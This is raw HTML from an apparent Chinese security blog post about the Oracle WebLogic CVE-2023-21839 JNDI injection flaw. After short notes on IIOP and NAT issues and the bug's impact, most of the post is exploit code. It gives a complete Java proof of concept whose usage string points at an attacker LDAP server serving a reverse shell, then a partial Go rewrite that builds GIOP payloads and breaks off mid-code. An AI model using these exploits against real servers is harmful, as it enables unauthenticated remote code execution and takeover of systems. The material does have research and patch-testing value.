11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>在公网上，IIOP协议和NAT转换之间存在冲突的网络问题，</p>\n<p>一般只能修改源码或者尝试<strong>iiop协议net绕过</strong><a href=\"https://xz.aliyun.com/t/8508\">Weblogic IIOP 协议NAT 网络绕过 - 先知社区 (aliyun.com)</a></p>\n<p>【冲突原因学习记在keynotes上，大致就是两者之间的ip指向和ip转换冲突，一个根据自身规则发送数据到私网ip，另一个根据自身规则把私网ip又变为公网ip，从而通讯连接失败】</p>\n<p>用go进行重写iiop的一些协议，从而避免在对公网或者docker进行操作的时候出现连接网络错误，当然java也是可以修改iiop规则的，视情况和能力而定</p></blockquote>\n<h3 id=\"远程代码执行原理\"><a href=\"#远程代码执行原理\" class=\"headerlink\" title=\"远程代码执行原理\"></a>远程代码执行原理</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>利用该漏洞允许未经身份验证的攻击者通过 <code>T3、IIOP</code> 进行网络访问，从而危害 Oracle WebLogic Server。成功攻击此漏洞可导致未经授权访问<code>关键数据或完全访问所有 Oracle WebLogic Server 可访问数据</code>。</p></blockquote>\n<h3 id=\"JAVA\"><a href=\"#JAVA\" class=\"headerlink\" title=\"JAVA\"></a>JAVA</h3><p>（不好的就是需要对应java版本跑，每个版本Java都要删去一些东西，还是go整洁的包舒服）</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class=\"line\"><span class=\"comment\">// (powered by FernFlower decompiler)</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Hashtable;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Random;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.InitialContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.NamingException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> weblogic.deployment.jms.ForeignOpaqueReference;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">CVE_2023_21839</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"type\">String</span> <span class=\"variable\">JNDI_FACTORY</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"type\">String</span> <span class=\"variable\">HOW_TO_USE</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;[*]java -jar 目标ip:端口 ldap地址\\ne.g. java -jar 192.168.220.129:7001 ldap://192.168.31.58:1389/Basic/ReverseShell/192.168.220.129/1111&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">CVE_2023_21839</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> InitialContext <span class=\"title function_\">getInitialContext</span><span class=\"params\">(String url)</span> <span class=\"keyword\">throws</span> NamingException &#123;</span><br><span class=\"line\">        Hashtable&lt;String, String&gt; env = <span class=\"keyword\">new</span> <span class=\"title class_\">Hashtable</span>();</span><br><span class=\"line\">        env.put(<span class=\"string\">&quot;java.naming.factory.initial&quot;</span>, JNDI_FACTORY);</span><br><span class=\"line\">        env.put(<span class=\"string\">&quot;java.naming.provider.url&quot;</span>, url);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">InitialContext</span>(env);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (args.length &lt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">            System.out.println(HOW_TO_USE);</span><br><span class=\"line\">            System.exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">t3Url</span> <span class=\"operator\">=</span> args[<span class=\"number\">0</span>];</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">ldapUrl</span> <span class=\"operator\">=</span> args[<span class=\"number\">1</span>];</span><br><span class=\"line\">        <span class=\"type\">InitialContext</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> getInitialContext(<span class=\"string\">&quot;t3://&quot;</span> + t3Url);</span><br><span class=\"line\">        Hashtable&lt;String, String&gt; env = <span class=\"keyword\">new</span> <span class=\"title class_\">Hashtable</span>();</span><br><span class=\"line\">        env.put(<span class=\"string\">&quot;java.naming.factory.initial&quot;</span>, <span class=\"string\">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">ForeignOpaqueReference</span> <span class=\"variable\">f</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ForeignOpaqueReference</span>();</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">jndiEnvironment</span> <span class=\"operator\">=</span> ForeignOpaqueReference.class.getDeclaredField(<span class=\"string\">&quot;jndiEnvironment&quot;</span>);</span><br><span class=\"line\">        jndiEnvironment.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        jndiEnvironment.set(f, env);</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">remoteJNDIName</span> <span class=\"operator\">=</span> ForeignOpaqueReference.class.getDeclaredField(<span class=\"string\">&quot;remoteJNDIName&quot;</span>);</span><br><span class=\"line\">        remoteJNDIName.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        remoteJNDIName.set(f, ldapUrl);</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">bindName</span> <span class=\"operator\">=</span> (<span class=\"keyword\">new</span> <span class=\"title class_\">Random</span>(System.currentTimeMillis())).nextLong() + <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            c.bind(bindName, f);</span><br><span class=\"line\">            c.lookup(bindName);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception var10) &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"GO-待看\"><a href=\"#GO-待看\" class=\"headerlink\" title=\"GO(待看)\"></a>GO(待看)</h3><figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">\t<span class=\"string\">&quot;CVE-2023-21839&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;encoding/binary&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;encoding/hex&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;flag&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;fmt&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;net&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;strings&quot;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> (</span><br><span class=\"line\">\thostConfig <span class=\"type\">string</span></span><br><span class=\"line\">\tportConfig <span class=\"type\">int</span></span><br><span class=\"line\">\tldapConfig <span class=\"type\">string</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> (</span><br><span class=\"line\">\tkey1    <span class=\"type\">string</span></span><br><span class=\"line\">\tkey2    <span class=\"type\">string</span></span><br><span class=\"line\">\tkey3    <span class=\"type\">string</span></span><br><span class=\"line\">\twlsKey1 <span class=\"type\">string</span></span><br><span class=\"line\">\twlsKey2 <span class=\"type\">string</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> (</span><br><span class=\"line\">\tServiceContext0 = &amp;giop.ServiceContext&#123;</span><br><span class=\"line\">\t\tVSCID:      giop.D(<span class=\"string\">&quot;000000&quot;</span>),</span><br><span class=\"line\">\t\tSCID:       giop.D(<span class=\"string\">&quot;05&quot;</span>),</span><br><span class=\"line\">\t\tEndianness: []<span class=\"type\">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class=\"line\">\t\tData:       giop.D(<span class=\"string\">&quot;000000000000010000000d3137322e32362e3131322e310000ec5b&quot;</span>),</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tServiceContext1 = &amp;giop.ServiceContext&#123;</span><br><span class=\"line\">\t\tVSCID:      giop.D(<span class=\"string\">&quot;000000&quot;</span>),</span><br><span class=\"line\">\t\tSCID:       giop.D(<span class=\"string\">&quot;01&quot;</span>),</span><br><span class=\"line\">\t\tEndianness: []<span class=\"type\">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class=\"line\">\t\tData:       giop.D(<span class=\"string\">&quot;0000000001002005010001&quot;</span>),</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tServiceContext2 = &amp;giop.ServiceContext&#123;</span><br><span class=\"line\">\t\tVSCID:      giop.D(<span class=\"string\">&quot;424541&quot;</span>),</span><br><span class=\"line\">\t\tSCID:       giop.D(<span class=\"string\">&quot;00&quot;</span>),</span><br><span class=\"line\">\t\tEndianness: []<span class=\"type\">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class=\"line\">\t\tData:       giop.D(<span class=\"string\">&quot;0a0301&quot;</span>),</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\tflag.StringVar(&amp;hostConfig, <span class=\"string\">&quot;ip&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"string\">&quot;ip&quot;</span>)</span><br><span class=\"line\">\tflag.IntVar(&amp;portConfig, <span class=\"string\">&quot;port&quot;</span>, <span class=\"number\">7001</span>, <span class=\"string\">&quot;port&quot;</span>)</span><br><span class=\"line\">\tflag.StringVar(&amp;ldapConfig, <span class=\"string\">&quot;ldap&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"string\">&quot;ldap&quot;</span>)</span><br><span class=\"line\">\tflag.Parse()</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> hostConfig == <span class=\"string\">&quot;&quot;</span> || ldapConfig == <span class=\"string\">&quot;&quot;</span> &#123;</span><br><span class=\"line\">\t\tfmt.Println(<span class=\"string\">&quot;Weblogic CVE-2023-21839&quot;</span>)</span><br><span class=\"line\">\t\tflag.Usage()</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> !strings.HasPrefix(ldapConfig, <span class=\"string\">&quot;ldap&quot;</span>) &#123;</span><br><span class=\"line\">\t\tfmt.Println(<span class=\"string\">&quot;Weblogic CVE-2023-21839&quot;</span>)</span><br><span class=\"line\">\t\tflag.Usage()</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfmt.Printf(<span class=\"string\">&quot;[*] your-ip: %s\\n&quot;</span>, hostConfig)</span><br><span class=\"line\">\tfmt.Printf(<span class=\"string\">&quot;[*] your-port: %d\\n&quot;</span>, portConfig)</span><br><span class=\"line\">\tfmt.Printf(<span class=\"string\">&quot;[*] your-ldap: %s\\n&quot;</span>, ldapConfig)</span><br><span class=\"line\"></span><br><span class=\"line\">\tvp := <span class=\"string\">&quot;743320392e322e302e300a41533a3235350a484c3a39320a4d5&quot;</span> +</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;33a31303030303030300a50553a74333a2f2f746573743a373030310a0a&quot;</span></span><br><span class=\"line\">\tver := giop.GetVersion(hostConfig, vp, portConfig)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ver == <span class=\"string\">&quot;12&quot;</span> &#123;</span><br><span class=\"line\">\t\tfmt.Println(<span class=\"string\">&quot;[*] weblogic 12&quot;</span>)</span><br><span class=\"line\">\t\twlsKey1 = <span class=\"string\">&quot;00424541080103000000000c41646d696e53657276657200000000000000003349&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;6f6e74657874416e793a312e3000000000000238000000000000014245412c0000001000&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;00000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class=\"line\">\t\twlsKey2 = <span class=\"string\">&quot;00424541080103000000000c41646d696e53657276657200000000000000003349&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;6f6e74657874416e793a312e30000000000004&#123;&#123;key3&#125;&#125;000000014245412c0000001000&quot;</span> +</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;00000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> <span 